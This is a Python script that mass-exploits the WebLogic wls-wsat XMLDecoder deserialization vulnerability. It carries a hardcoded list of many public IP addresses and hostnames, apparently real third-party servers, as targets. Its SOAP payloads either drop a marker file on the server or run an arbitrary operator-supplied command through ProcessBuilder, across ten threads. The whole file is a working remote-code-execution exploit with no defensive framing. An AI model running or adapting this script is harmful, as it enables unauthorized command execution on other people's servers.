#!/usr/bin/env python
#coding:utf-8
__author__ = 'orleven'
import requests
import argparse
import threading
import random

targetList = [
    "http://192.168.111.145:7001",
    "http://115.233.6.84:8001",
"http://115.233.6.84:9001",
"http://115.233.6.85:8080",
"https://115.233.6.86",
"http://115.233.6.86",
"http://115.233.6.86:8823",
"http://115.233.6.86:8823",
"http://115.233.6.87:9001",
"http://115.233.6.88:9090",
"https://115.233.6.92",
"https://115.233.6.92:4443",
"http://115.239.136.23",
"http://115.239.138.153:8080",
"http://115.239.138.154:8701",
"http://115.239.138.154:8701",
"http://115.239.138.155:8701",
"http://115.239.138.155:8702",
"http://115.239.138.156:8001",
"http://ifamily.appcrews.com",
"http://115.239.138.158",
"http://115.239.138.160:8080",
"http://115.239.138.160:8081",
"http://115.239.138.160:8080",
"http://115.239.138.162:8080",
"http://eask.zjtelecom.com.cn:9060",
"http://eask.zjtelecom.com.cn:9090",
"http://115.239.138.164:8001",
"http://115.239.138.165:8080",
"http://115.239.138.166:8080",
"http://115.239.138.170",
"http://115.239.138.171:8001",
"https://mobile.zjhcsoft.com:8002",
"http://115.239.138.173:9080",
"https://mobile.zjhcsoft.com:8002",
"http://115.239.138.174:9080",
"https://mobile.zjhcsoft.com:8002",
"https://mobile.zjhcsoft.com:8002",
"http://122.224.246.4",
"http://122.224.246.7",
"http://122.224.246.8:8921",
"https://202.96.118.119",
"http://60.190.255.21:7021",
"http://60.190.255.21:18081",
"http://60.190.255.21:6600",
"http://60.190.255.24",
"http://60.190.255.24",
"http://60.190.255.28:8001",
"http://115.233.6.84:8001",
"http://60.190.255.28:8001",
"http://115.233.6.84:8001",
"http://60.190.255.28:8001",
"http://115.239.138.171:8001",



]

headers = {}
headers["Content-Type"] = "text/xml"
html_escape_table = {
    "&": "&amp;",
    '"': "&quot;",
    "'": "&apos;",
    ">": "&gt;",
    "<": "&lt;",
}
poc1 = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="'''

poc3 = '''
</array>
<void method="start" />
</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
</soapenv:Body>
</soapenv:Envelope>
'''
threadList = []
threadNum = 10
timeout = 3


def _execute(url,poc):
    try:
        if poc == None:
            targeturl = url +  "/wls-wsat/CoordinatorPortType"
            ran =  str(random.randint(100000,999999))
            poc = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/' +  ran + '</string><void method="println"><string>xmldecoder_vul_test</string></void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'
            result = requests.post(targeturl, data = poc,headers = headers,timeout=timeout)
            targeturl = url+ "/wls-wsat/"+ran
            result = requests.get(targeturl ,timeout=timeout)
            if str(result.status_code) == '200' and 'xmldecoder_vul_test' in result.text:
                print '[+] '+ str(result.status_code)+ '  ' + targeturl +  "\r\n",
            else:
                print '[-] '+ str(result.status_code)+ '  ' + url + "\r\n",
        else:
            targeturl = url +  "/wls-wsat/CoordinatorPortType"
            result = requests.post(targeturl, data = poc,headers = headers,timeout=timeout)
            if str(result.status_code) == '500' and 'faultstring' in  result.text and 'faultcode' in result.text:
                print '[+] '+ str(result.status_code)+ '  ' + url +  "\r\n",
            else:
                print '[-] '+ str(result.status_code)+ '  ' + url + "\r\n",
            # print result.text
    except:
        print '[!]  0   ' + 'Time out: '+ url + "\r\n",

def execute(threadId,poc):
    for i in xrange(threadId,len(targetList),threadNum):
        dic = _execute(targetList[i],poc)
        
def scan(command):
    print "[.] Run start: Total " + str(len(targetList)) + " request!"+ "\r\n",
    poc2 = ''
    poc = None
    if command != None:
        commands = command.split()
        for i in xrange(0,len(commands)):
            poc2 += '<void index="' + str(i) + '"><string>' +"".join(html_escape_table.get(c, c) for c in commands[i]) + '</string></void>'
        poc = poc1 + str(len(commands)) + '">' + poc2 + poc3
        # print poc
    for threadId in xrange(0,threadNum):
        t = threading.Thread(target=execute,args=(threadId,poc,))
        t.start()
        threadList.append(t)
    for num in xrange(0,threadNum):
        threadList[num].join()

    print "\r\n[.] Run over!"+ "\r\n",
    print '[.] Please check result by ping, nslookup and so on. '+ "\r\n",

def argSet(parser):
    parser.add_argument("-c", "--command", type=str, help="The command e.g. /usr/bin/touch test", default=None)
    parser.add_argument("-u", "--url", type=str, help="The target url e.g. http://192.168.111.1:7001", default=None)
    parser.add_argument("-f", "--file",type=str, help="Load ip dictionary e.g. url.txt", default=None)
    return parser


def handle(args):
    target = args.url
    if target!=None:
        targetList.append(target)
    filepath = args.file
    if filepath != None:
        if os.path.isfile(filepath):
            with open(filepath, 'r') as f:
                for line in f.readlines():
                    myline = line.strip('\r').strip('\n')
                    targetList.append(myline)
        else:
            print "[-] The path is not exist!"
    command = args.command
    scan(command)


if __name__=='__main__':
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
    parser = argSet(parser)
    args = parser.parse_args()
    handle(args)




